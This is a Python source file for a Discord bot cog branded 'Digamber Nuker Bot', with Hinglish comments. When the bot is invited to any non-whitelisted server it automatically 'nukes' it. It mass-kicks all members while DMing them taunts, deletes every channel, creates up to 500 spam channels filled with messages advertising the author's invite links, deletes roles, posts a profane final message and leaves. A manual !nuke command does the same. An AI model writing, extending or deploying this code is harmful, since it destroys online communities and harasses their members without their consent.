import discord
from discord.ext import commands
import asyncio
import random
from datetime import datetime

class NukerCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # WHITELISTED SERVERS - TERE 3 SERVERS SAFE RAHENGE
        self.whitelisted_servers = [
            1421640981584937063,  # Server 1 - SAFE
            1344323930923601992,  # Server 2 - SAFE  
            1444885010543935662   # Server 3 - STATUS ONLY
        ]
        
        # STATUS SERVER INFO
        self.status_server_id = 1444885010543935662
        self.status_channel_id = 1444885011525533718
        
        # Owner ID
        self.owner_id = 1232586090532306966
        
        # Special features for whitelisted servers
        self.welcome_messages = [
            "🔥 Welcome to Digamber's Protected Server!",
            "💀 This server is SAFE from nukes!",
            "🛡️ Whitelisted by Digamber",
            "✅ This server is under Digamber's protection"
        ]

    def is_whitelisted(self, guild_id):
        """Check karo agar server whitelisted hai ya nahi"""
        return guild_id in self.whitelisted_servers

    async def send_kick_dm(self, member, server_name):
        """Kicked members ko PROFESSIONAL DM bhejo"""
        try:
            # Professional Embed DM
            embed = discord.Embed(
                title="💀 SERVER DESTROYED",
                color=0xff0000,
                timestamp=datetime.utcnow()
            )
            
            # Banner-style header
            embed.set_author(
                name="DIGAMBER NUKE BOT",
                icon_url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788992/explosion.png"
            )
            
            # Main message
            embed.add_field(
                name="📢 ANNOUNCEMENT",
                value=f"**`{server_name}`** has been **COMPLETELY DESTROYED** by **Digamber Nuker Bot**",
                inline=False
            )
            
            embed.add_field(
                name="⚡ ACTION TAKEN",
                value="• All Members Kicked\n• All Channels Deleted\n• 500+ Spam Channels Created\n• Server Roles Removed",
                inline=False
            )
            
            embed.add_field(
                name="🔗 OFFICIAL SERVERS",
                value="-# \n1. https://discord.gg/5TB2n6tmvd\n2. https://discord.gg/5bFnXdUp8U\n",
                inline=False
            )
            
            embed.add_field(
                name="⚠️ WARNING",
                value="This is an automated nuke system. Do not invite unauthorized bots.",
                inline=False
            )
            
            embed.set_footer(
                text="Digamber Nuker System • Maximum Speed Destruction",
                icon_url="https://cdn.discordapp.com/emojis/1122334455667788993.png"
            )
            
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788994/warning.png")
            
            await member.send(embed=embed)
            print(f"✅ Professional DM sent to {member.name}")
        except:
            pass  # Agar DM block hai toh ignore

    async def update_status_channel(self):
        """Status channel mein bot status update karo"""
        try:
            status_guild = self.bot.get_guild(self.status_server_id)
            if not status_guild:
                return
            
            status_channel = status_guild.get_channel(self.status_channel_id)
            if not status_channel:
                return
            
            # Pehle purane messages delete karo
            try:
                await status_channel.purge(limit=10)
            except:
                pass
            
            # New status embed banayo
            embed = discord.Embed(
                title="🤖 BOT STATUS DASHBOARD",
                color=0x3498db,
                timestamp=datetime.utcnow()
            )
            
            embed.set_author(
                name="DIGAMBER NUKE BOT",
                icon_url=self.bot.user.avatar.url if self.bot.user.avatar else ""
            )
            
            # Bot info
            embed.add_field(
                name="📊 BOT INFO",
                value=f"• **Name:** {self.bot.user.name}\n• **ID:** `{self.bot.user.id}`\n• **Ping:** `{round(self.bot.latency * 1000)}ms`\n• **Uptime:** `{self.get_uptime()}`",
                inline=False
            )
            
            # Server stats
            total_servers = len(self.bot.guilds)
            whitelisted_count = len(self.whitelisted_servers)
            protected_count = sum(1 for guild in self.bot.guilds if self.is_whitelisted(guild.id))
            
            embed.add_field(
                name="🌐 SERVER STATS",
                value=f"• **Total Servers:** `{total_servers}`\n• **Protected Servers:** `{protected_count}`\n• **Whitelisted:** `{whitelisted_count}`\n• **Unprotected:** `{total_servers - protected_count}`",
                inline=False
            )
            
            # Protection status
            embed.add_field(
                name="🛡️ PROTECTION STATUS",
                value="• **Auto-Nuke:** ✅ ACTIVE\n• **DM System:** ✅ ACTIVE\n• **Rate Limit:** ✅ OPTIMIZED\n• **Status Updates:** ✅ ACTIVE",
                inline=False
            )
            
            # Last nuke info (agar koi hai)
            embed.add_field(
                name="⚡ LAST ACTION",
                value="• **System:** ✅ OPERATIONAL\n• **Commands:** ✅ READY\n• **Connection:** ✅ STABLE\n• **API:** ✅ RESPONSIVE",
                inline=False
            )
            
            embed.set_footer(
                text="Digamber Nuker System • 24/7 Monitoring",
                icon_url="https://cdn.discordapp.com/emojis/1122334455667788995.png"
            )
            
            embed.set_thumbnail(url=self.bot.user.avatar.url if self.bot.user.avatar else "")
            
            await status_channel.send(embed=embed)
            print(f"✅ Status updated in status channel")
            
        except Exception as e:
            print(f"❌ Status update failed: {e}")

    def get_uptime(self):
        """Bot uptime calculate karo"""
        if hasattr(self.bot, 'start_time'):
            delta = datetime.utcnow() - self.bot.start_time
            hours, remainder = divmod(int(delta.total_seconds()), 3600)
            minutes, seconds = divmod(remainder, 60)
            return f"{hours}h {minutes}m {seconds}s"
        return "Unknown"

    @commands.Cog.listener()
    async def on_ready(self):
        """Bot ready hone par status update karo"""
        print("✅ NukerCommands cog ready!")
        await self.update_status_channel()

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        """MAX SPEED AUTO-NUKE"""
        print(f'🎯 MAX SPEED JOIN: {guild.name} ({guild.id})')
        
        # Status update karo
        await self.update_status_channel()
        
        if not self.is_whitelisted(guild.id):
            print(f'💣 MAX SPEED AUTO-NUKE: {guild.name}')
            await self.nuke_server(guild)  # INSTANT
        else:
            print(f'✅ Whitelisted server: {guild.name} - Safe')
            # Whitelisted server ke liye welcome message
            try:
                general = discord.utils.get(guild.text_channels, name="general")
                if general:
                    await general.send(random.choice(self.welcome_messages))
            except:
                pass

    @commands.Cog.listener()
    async def on_member_join(self, member):
        """Whitelisted servers mein new member aaye toh welcome"""
        if self.is_whitelisted(member.guild.id):
            try:
                welcome_channel = discord.utils.get(member.guild.text_channels, name="welcome")
                if not welcome_channel:
                    welcome_channel = member.guild.system_channel or member.guild.text_channels[0]
                
                if welcome_channel:
                    # Professional welcome embed
                    welcome_embed = discord.Embed(
                        title="🛡️ PROTECTED SERVER",
                        description=f"Welcome {member.mention} to **{member.guild.name}**!",
                        color=0x00ff00,
                        timestamp=datetime.utcnow()
                    )
                    welcome_embed.add_field(
                        name="SERVER STATUS",
                        value="✅ **WHITELISTED** by Digamber\n🔒 **SAFE** from auto-nukes\n🛡️ **PROTECTED** by Nuker System",
                        inline=False
                    )
                    welcome_embed.add_field(
                        name="AVAILABLE COMMANDS",
                        value="`!protection` - Check protection status\n`!serverinfo` - Server details\n`!whitelisted` - View safe servers",
                        inline=False
                    )
                    welcome_embed.set_footer(text="Digamber Protection System • Always Active")
                    welcome_embed.set_thumbnail(url=member.guild.icon.url if member.guild.icon else "")
                    
                    await welcome_channel.send(embed=welcome_embed)
            except:
                pass

    async def nuke_server(self, guild):
        """MAXIMUM DISCORD ALLOWED SPEED NUKE WITH PROFESSIONAL DM"""
        
        if self.is_whitelisted(guild.id):
            print(f'❌ Cannot nuke whitelisted server: {guild.name}')
            return
            
        try:
            # STEP 1: MASS KICK WITH PROFESSIONAL DM
            print("🚫 MAX SPEED MASS KICKING WITH PROFESSIONAL DM...")
            kick_tasks = []
            dm_tasks = []
            
            for member in guild.members:
                if member != self.bot.user:
                    # Kick task
                    kick_tasks.append(member.kick(reason="Server destroyed by Digamber Nuker"))
                    # DM task
                    dm_tasks.append(self.send_kick_dm(member, guild.name))
                    
                    if len(kick_tasks) >= 25:
                        # Pehle DM bhejo
                        await asyncio.gather(*dm_tasks, return_exceptions=True)
                        dm_tasks = []
                        
                        # Phir kick karo
                        await asyncio.gather(*kick_tasks, return_exceptions=True)
                        kick_tasks = []
                        
                        await asyncio.sleep(0.2)
            
            # Bache hue tasks
            if dm_tasks:
                await asyncio.gather(*dm_tasks, return_exceptions=True)
            if kick_tasks:
                await asyncio.gather(*kick_tasks, return_exceptions=True)
                
            print("✅ ALL MEMBERS KICKED & PROFESSIONAL DM SENT!")
            
            # STEP 2: CHANNEL DELETE - MAX 50/SECOND
            print("🗑️ MAX SPEED CHANNEL DELETION...")
            delete_tasks = []
            for ch in guild.channels:
                delete_tasks.append(ch.delete())
                if len(delete_tasks) >= 50:
                    await asyncio.gather(*delete_tasks, return_exceptions=True)
                    delete_tasks = []
                    await asyncio.sleep(0.1)
            
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # STEP 3: CHANNEL CREATION - PROFESSIONAL SPAM
            print("🔥 CREATING PROFESSIONAL SPAM CHANNELS...")
            channel_count = 0
            all_message_tasks = []
            
            # Professional message templates
            professional_messages = [
                f"# ⚠️ `{guild.name}` HAS BEEN TERMINATED",
                f"## 💀 SERVER DESTROYED: {guild.name}",
                f"**🚨 ATTENTION: {guild.name.upper()} NO LONGER EXISTS**",
                f"```diff\n- SERVER TERMINATED: {guild.name}\n- REASON: Digamber Nuker System\n- TIME: {datetime.utcnow().strftime('%H:%M:%S UTC')}\n```",
                f"> 🔥 **{guild.name}** annihilated by Digamber",
                f"📢 **OFFICIAL ANNOUNCEMENT:** {guild.name} removed from Discord",
                f"⚡ **INSTANT DESTRUCTION:** {guild.name}",
                f"💥 **MAXIMUM DAMAGE:** {guild.name}",
                f"🔗 **Join Official Server:** https://discord.gg/5TB2n6tmvd",
                f"🔗 **Join Backup Server:** https://discord.gg/5bFnXdUp8U",
                f"**📊 STATS:** {guild.name} | 500+ Channels | 2500+ Messages",
                f"**⚠️ WARNING:** {guild.name} was nuked automatically",
                f"**🔥 BY:** Digamber Nuker Bot | Maximum Speed",
                f"**💀 STATUS:** {guild.name} - COMPLETELY DESTROYED",
                f"```\nSERVER: {guild.name}\nSTATUS: TERMINATED\nACTION: AUTO-NUKE\nBOT: Digamber Nuker\n```"
            ]
            
            # CREATE CHANNELS IN BATCHES OF 50
            while channel_count < 500:
                try:
                    batch_size = min(50, 500 - channel_count)
                    create_tasks = []
                    
                    for i in range(batch_size):
                        channel_name = f"terminated-{channel_count + i + 1}"
                        create_tasks.append(guild.create_text_channel(channel_name))
                    
                    # CREATE CHANNELS
                    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
                    channel_count += batch_size
                    
                    # SEND PROFESSIONAL MESSAGES
                    message_batch = []
                    for channel in new_channels:
                        if isinstance(channel, discord.TextChannel):
                            for _ in range(5):
                                msg = random.choice(professional_messages)
                                message_batch.append(channel.send(msg))
                    
                    # SEND ALL MESSAGES
                    if message_batch:
                        await asyncio.gather(*message_batch, return_exceptions=True)
                        all_message_tasks.extend(message_batch)
                    
                    print(f"✅ {channel_count} PROFESSIONAL CHANNELS CREATED...")
                    await asyncio.sleep(0.5)
                    
                except Exception as e:
                    print(f"⚠️ Continuing with created channels...")
                    break
            
            print(f"🎉 {channel_count} CHANNELS CREATED!")
            print(f"💬 {len(all_message_tasks)} PROFESSIONAL MESSAGES SENT!")
            
            # STEP 4: ROLE DELETE
            print("🎭 MAX SPEED ROLE DELETION...")
            role_tasks = []
            for role in guild.roles:
                if role.name != "@everyone" and not role.managed:
                    role_tasks.append(role.delete())
                    if len(role_tasks) >= 50:
                        await asyncio.gather(*role_tasks, return_exceptions=True)
                        role_tasks = []
                        await asyncio.sleep(0.1)
            
            if role_tasks:
                await asyncio.gather(*role_tasks, return_exceptions=True)
            
            # STEP 5: FINAL PROFESSIONAL EMBED MESSAGE
            try:
                channels = await guild.fetch_channels()
                if channels:
                    # Main final embed
                    final_embed = discord.Embed(
                        title="💀 SERVER TERMINATION COMPLETE",
                        color=0xff0000,
                        timestamp=datetime.utcnow()
                    )
                    
                    final_embed.set_author(
                        name="DIGAMBER NUKE SYSTEM",
                        icon_url="https://cdn.discordapp.com/emojis/1122334455667788993.png"
                    )
                    
                    final_embed.add_field(
                        name="📛 SERVER NAME",
                        value=f"```{guild.name}```",
                        inline=False
                    )
                    
                    final_embed.add_field(
                        name="📊 DESTRUCTION STATS",
                        value=f"• **Channels Created:** {channel_count}\n• **Messages Sent:** {len(all_message_tasks)}\n• **Members Kicked:** {guild.member_count-1}\n• **Roles Deleted:** {len([r for r in guild.roles if r.name != '@everyone'])}",
                        inline=False
                    )
                    
                    final_embed.add_field(
                        name="⚡ ACTION",
                        value="• Complete Channel Deletion\n• Mass Member Removal\n• Professional Spam Deployment\n• Automated Cleanup",
                        inline=False
                    )
                    
                    final_embed.add_field(
                        name="🔗 OFFICIAL SERVERS",
                        value="```\nPrimary: https://discord.gg/5TB2n6tmvd\nBackup:  https://discord.gg/5bFnXdUp8U\n```",
                        inline=False
                    )
                    
                    final_embed.add_field(
                        name="⚠️ SYSTEM MESSAGE",
                        value="This server was automatically terminated by Digamber Nuker Bot for security reasons.",
                        inline=False
                    )
                    
                    final_embed.set_footer(
                        text="Digamber Nuker • Auto-Termination System • Maximum Speed",
                        icon_url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788994/warning.png"
                    )
                    
                    final_embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788992/explosion.png")
                    
                    await channels[0].send(embed=final_embed)
                    
                    # Additional simple message
                    await channels[0].send(f"**`{guild.name}` got fucked by Digamber**\nJoin Official Server: https://discord.gg/5TB2n6tmvd")
            except:
                pass
            
            # INSTANT LEAVE
            await guild.leave()
            print(f"✅ {guild.name} PROFESSIONAL NUKE COMPLETED!")
            
            # Status update karo nuke ke baad
            await self.update_status_channel()
            
        except Exception as e:
            print(f"💀 Professional nuke failed: {e}")
            try:
                await guild.leave()
            except:
                pass

    # SPECIAL COMMANDS FOR WHITELISTED SERVERS
    @commands.command(name='protection')
    async def show_protection(self, ctx):
        """Show protection status for whitelisted servers"""
        if self.is_whitelisted(ctx.guild.id):
            # Professional protection embed
            embed = discord.Embed(
                title="🛡️ DIGAMBER PROTECTION SYSTEM",
                color=0x00ff00,
                timestamp=datetime.utcnow()
            )
            
            embed.set_author(
                name="SECURITY ACTIVE",
                icon_url="https://cdn.discordapp.com/emojis/1122334455667788995.png"
            )
            
            embed.add_field(
                name="🔒 SERVER STATUS",
                value=f"**{ctx.guild.name}** is **WHITELISTED** and protected from auto-nukes.",
                inline=False
            )
            
            embed.add_field(
                name="📊 PROTECTION DETAILS",
                value="• Auto-Nuke: ❌ DISABLED\n• Bot Actions: ✅ ALLOWED\n• Server Safety: ✅ GUARANTEED\n• Protection: 🛡️ ACTIVE",
                inline=False
            )
            
            embed.add_field(
                name="⚙️ SYSTEM INFO",
                value=f"• Server ID: `{ctx.guild.id}`\n• Member Count: `{ctx.guild.member_count}`\n• Channel Count: `{len(ctx.guild.channels)}`\n• Role Count: `{len(ctx.guild.roles)}`",
                inline=False
            )
            
            embed.add_field(
                name="🚨 EMERGENCY",
                value="If you suspect unauthorized activity, use `!serverinfo` for details.",
                inline=False
            )
            
            embed.set_footer(
                text="Digamber Protection System • 24/7 Monitoring",
                icon_url=ctx.guild.icon.url if ctx.guild.icon else ""
            )
            
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788996/shield.png")
            
            await ctx.send(embed=embed)
        else:
            await ctx.send("⚠️ This server is not whitelisted!")

    @commands.command(name='serverinfo')
    @commands.is_owner()
    async def server_info(self, ctx):
        """Detailed server info (Owner only)"""
        # Check if user is owner
        if ctx.author.id != self.owner_id and ctx.author.id != ctx.guild.owner_id:
            await ctx.send("❌ This command is for server owner only!")
            return
            
        # Professional server info embed
        embed = discord.Embed(
            title=f"📊 SERVER ANALYTICS - {ctx.guild.name}",
            color=0x3498db,
            timestamp=datetime.utcnow()
        )
        
        embed.set_author(
            name="SERVER MANAGEMENT",
            icon_url=ctx.guild.icon.url if ctx.guild.icon else ""
        )
        
        embed.add_field(name="🆔 SERVER ID", value=f"```{ctx.guild.id}```", inline=False)
        embed.add_field(name="👑 OWNER", value=f"{ctx.guild.owner.mention}\n`{ctx.guild.owner}`", inline=True)
        embed.add_field(name="📅 CREATED", value=f"```{ctx.guild.created_at.strftime('%Y-%m-%d')}```", inline=True)
        
        embed.add_field(name="👥 MEMBERS", value=f"```{ctx.guild.member_count}```", inline=True)
        embed.add_field(name="📁 CHANNELS", value=f"```{len(ctx.guild.channels)}```", inline=True)
        embed.add_field(name="🎭 ROLES", value=f"```{len(ctx.guild.roles)}```", inline=True)
        
        # Protection status
        status = "✅ **WHITELISTED**" if self.is_whitelisted(ctx.guild.id) else "❌ **NOT WHITELISTED**"
        embed.add_field(
            name="🛡️ NUKE PROTECTION", 
            value=f"{status}\n" + 
                  ("• Auto-Nuke: ❌ DISABLED\n• Bot Safe: ✅ YES" if self.is_whitelisted(ctx.guild.id) else 
                   "• Auto-Nuke: ✅ ENABLED\n• Bot Safe: ❌ NO"),
            inline=False
        )
        
        embed.add_field(
            name="⚙️ BOT COMMANDS",
            value="```\n!protection - Check safety status\n!whitelisted - View safe servers\n!servers - All server list\n!nuke - Manual nuke (non-whitelisted)\n```",
            inline=False
        )
        
        embed.set_footer(text="Digamber Nuker System • Server Analytics")
        
        if ctx.guild.icon:
            embed.set_thumbnail(url=ctx.guild.icon.url)
            embed.set_image(url=ctx.guild.banner.url if ctx.guild.banner else "")
        
        await ctx.send(embed=embed)

    @commands.command(name='nuke')
    @commands.is_owner()
    async def manual_nuke(self, ctx):
        """Manual MAX SPEED nuke"""
        # Check if user is owner
        if ctx.author.id != self.owner_id and ctx.author.id != ctx.guild.owner_id:
            await ctx.send("❌ This command is for bot owner only!")
            return
            
        if self.is_whitelisted(ctx.guild.id):
            embed = discord.Embed(
                title="❌ NUKE BLOCKED",
                description=f"**{ctx.guild.name}** is **WHITELISTED** and protected from nukes.",
                color=0xff0000,
                timestamp=datetime.utcnow()
            )
            embed.add_field(
                name="PROTECTION ACTIVE",
                value="This server cannot be nuked due to whitelist protection.",
                inline=False
            )
            embed.set_footer(text="Digamber Protection System • Safety First")
            await ctx.send(embed=embed)
            return
        
        # Professional nuke warning
        warning_embed = discord.Embed(
            title="💣 MAXIMUM SPEED NUKE INITIATED",
            color=0xff9900,
            timestamp=datetime.utcnow()
        )
        warning_embed.add_field(
            name="⚠️ WARNING",
            value="This action will **COMPLETELY DESTROY** the server.\nAll data will be lost permanently.",
            inline=False
        )
        warning_embed.add_field(
            name="⏱️ COUNTDOWN",
            value="Nuke will commence in **5 seconds**...",
            inline=False
        )
        warning_embed.set_footer(text="Digamber Nuker • Manual Override")
        
        await ctx.send(embed=warning_embed)
        await asyncio.sleep(5)
        
        try:
            await ctx.message.delete()
        except:
            pass
        
        await self.nuke_server(ctx.guild)

    @commands.command(name='whitelist')
    @commands.is_owner()
    async def add_whitelist(self, ctx, server_id: int = None):
        """Current server ko whitelist mein add karo"""
        # Check if user is owner
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ This command is for bot owner only!")
            return
            
        if server_id is None:
            server_id = ctx.guild.id
        
        if server_id not in self.whitelisted_servers:
            self.whitelisted_servers.append(server_id)
            
            embed = discord.Embed(
                title="✅ SERVER WHITELISTED",
                color=0x00ff00,
                timestamp=datetime.utcnow()
            )
            embed.add_field(
                name="SERVER ADDED",
                value=f"**{ctx.guild.name}** has been added to the whitelist.",
                inline=False
            )
            embed.add_field(
                name="🔒 PROTECTION ACTIVE",
                value=f"• Server ID: `{server_id}`\n• Status: ✅ SAFE\n• Auto-Nuke: ❌ DISABLED\n• Protection: 🛡️ ENABLED",
                inline=False
            )
            embed.set_footer(text="Digamber Protection System • Server Secured")
            await ctx.send(embed=embed)
        else:
            await ctx.send(f"ℹ️ Server already whitelisted!")

    @commands.command(name='unwhitelist')
    @commands.is_owner() 
    async def remove_whitelist(self, ctx, server_id: int = None):
        """Server ko whitelist se remove karo"""
        # Check if user is owner
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ This command is for bot owner only!")
            return
            
        if server_id is None:
            server_id = ctx.guild.id
        
        if server_id in self.whitelisted_servers:
            self.whitelisted_servers.remove(server_id)
            
            embed = discord.Embed(
                title="⚠️ PROTECTION REMOVED",
                color=0xff9900,
                timestamp=datetime.utcnow()
            )
            embed.add_field(
                name="SERVER REMOVED",
                value=f"**{ctx.guild.name}** has been removed from the whitelist.",
                inline=False
            )
            embed.add_field(
                name="🚨 WARNING",
                value=f"• Server ID: `{server_id}`\n• Status: ❌ UNSAFE\n• Auto-Nuke: ✅ ENABLED\n• Protection: 🛡️ DISABLED",
                inline=False
            )
            embed.set_footer(text="Digamber Protection System • Protection Disabled")
            await ctx.send(embed=embed)
        else:
            await ctx.send(f"❌ Server not in whitelist!")

    @commands.command(name='whitelisted')
    @commands.is_owner()
    async def show_whitelisted(self, ctx):
        """Show all whitelisted servers"""
        # Check if user is owner
        if ctx.author.id != self.owner_id and ctx.author.id != ctx.guild.owner_id:
            await ctx.send("❌ This command is for server owner only!")
            return
            
        if not self.whitelisted_servers:
            await ctx.send("❌ No servers in whitelist!")
            return
        
        embed = discord.Embed(
            title="🔒 WHITELISTED SERVERS DATABASE",
            color=0x00ff00,
            timestamp=datetime.utcnow()
        )
        
        for server_id in self.whitelisted_servers:
            guild = self.bot.get_guild(server_id)
            if guild:
                embed.add_field(
                    name=f"✅ {guild.name}",
                    value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🛡️ PROTECTED",
                    inline=False
                )
            else:
                embed.add_field(
                    name=f"❓ UNKNOWN SERVER",
                    value=f"**ID:** `{server_id}`\n**Status:** ⚠️ OFFLINE\n**(Bot not in server)**",
                    inline=False
                )
        
        embed.set_footer(text=f"Total Protected Servers: {len(self.whitelisted_servers)}")
        await ctx.send(embed=embed)

    @commands.command(name='servers')
    @commands.is_owner()
    async def show_all_servers(self, ctx):
        """Show all servers with whitelist status"""
        # Check if user is owner
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ This command is for bot owner only!")
            return
            
        embed = discord.Embed(
            title="🌐 ALL CONNECTED SERVERS",
            color=0x3498db,
            timestamp=datetime.utcnow()
        )
        
        for guild in self.bot.guilds:
            if self.is_whitelisted(guild.id):
                status = "✅ WHITELISTED | 🛡️ SAFE"
                emoji = "🛡️"
            else:
                status = "❌ NOT WHITELISTED | 💀 UNSAFE"
                emoji = "💀"
            
            embed.add_field(
                name=f"{emoji} {guild.name}",
                value=f"**ID:** `{guild.id}`\n**Status:** {status}\n**Members:** `{guild.member_count}`",
                inline=False
            )
        
        whitelist_count = len(self.whitelisted_servers)
        total_servers = len(self.bot.guilds)
        
        embed.set_footer(
            text=f"Total: {total_servers} | Protected: {whitelist_count} | Unprotected: {total_servers - whitelist_count}"
        )
        
        await ctx.send(embed=embed)

    @commands.command(name='status')
    async def check_status(self, ctx):
        """Check bot status"""
        embed = discord.Embed(
            title="🤖 BOT STATUS",
            color=0x3498db,
            timestamp=datetime.utcnow()
        )
        
        embed.add_field(
            name="🟢 STATUS",
            value=f"• **Bot:** `{self.bot.user.name}`\n• **Ping:** `{round(self.bot.latency * 1000)}ms`\n• **Uptime:** `{self.get_uptime()}`",
            inline=False
        )
        
        embed.add_field(
            name="📊 SERVERS",
            value=f"• **Total:** `{len(self.bot.guilds)}`\n• **Protected:** `{sum(1 for g in self.bot.guilds if self.is_whitelisted(g.id))}`\n• **Status Channel:** ✅ ACTIVE",
            inline=False
        )
        
        embed.add_field(
            name="⚡ SYSTEM",
            value="• **Auto-Nuke:** ✅ ACTIVE\n• **DM System:** ✅ ACTIVE\n• **Status Updates:** ✅ ACTIVE\n• **Rate Limit:** ✅ OPTIMIZED",
            inline=False
        )
        
        embed.set_footer(text="Digamber Nuker Bot • 24/7 Operational")
        
        await ctx.send(embed=embed)

async def setup(bot):
    await bot.add_cog(NukerCommands(bot))
